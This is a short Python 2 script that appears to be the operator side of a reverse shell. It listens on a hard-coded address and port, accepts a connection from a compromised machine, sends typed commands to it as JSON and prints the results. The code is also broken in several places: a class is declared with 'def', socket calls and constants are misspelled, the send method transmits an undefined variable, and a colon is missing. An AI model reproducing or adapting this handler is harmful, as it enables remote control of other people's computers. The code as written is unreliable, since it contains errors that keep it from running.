import socket
import json
def socketListener:
	def __init__(self,ip,port):
		myListener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		myListener.setsocket(socket.SOL_SOCKET,socket.SO_RESUSEADDR,1)
		myListener.bind((ip,port))
		myListener.listen(0)
		print("Listening...")
		(self.myConnection, myAddress) = myListener.accept()
		print("Connection OK form "+ str(myAddress))
	
	def json_send(self,data):
		json_data = json.dumps(data)
		self.myConnection.send(commandInput)
		
	def json_recieve(self):
		json_data = self.myConnection.recv(1024)
		return json.loads(json_data)

	def commandExecution(self,commandInput)
		self.json_send(commandInput)
		return self.json_recieve()

	def startListening(self):
		while True:
			commandInput=raw_input("Enter command: ") 
			#raw input is strictly python2
			commandOutput= self.commandExecution(commandInput)
			print(commandOutput)
mySocketListener = socketListener("192.168.43.106", 8080)
mySocketListener.startListening()